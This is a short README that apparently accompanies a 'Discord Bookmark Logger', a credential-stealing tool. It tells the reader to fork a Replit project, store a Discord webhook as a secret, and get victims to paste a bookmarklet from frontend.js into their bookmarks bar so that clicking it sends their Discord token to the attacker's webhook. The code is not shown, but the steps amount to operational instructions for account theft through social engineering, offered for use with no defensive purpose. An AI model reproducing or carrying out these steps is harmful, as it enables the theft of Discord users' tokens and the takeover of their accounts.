# Discord-Bookmark-Logger-free-working
This is a leak of a Discord Bookmark Logger i made, which was pretty easy.

steps:

fork my replit @ https://replit.com/@5slaughter/ayasysyay

once you've forked it, click "RUN" at the top.

once you click run it should show a URL that will be hosting your bookmark.

copy that url, and go to frontend.js and change the URL there to the URL the site gave you.

once you've forked that, you need to go to >> tools >> secrets.

once your at the secrets page, make a secret called "hook" as the name, and put your discord webhook as the value.

you are now done.

to logs people, make the click ctrl shift b to open their bookmarks bar, then right click, then click "add new" then in the value form, place the code in frontend.js.

it should send their discord token to your webhook.
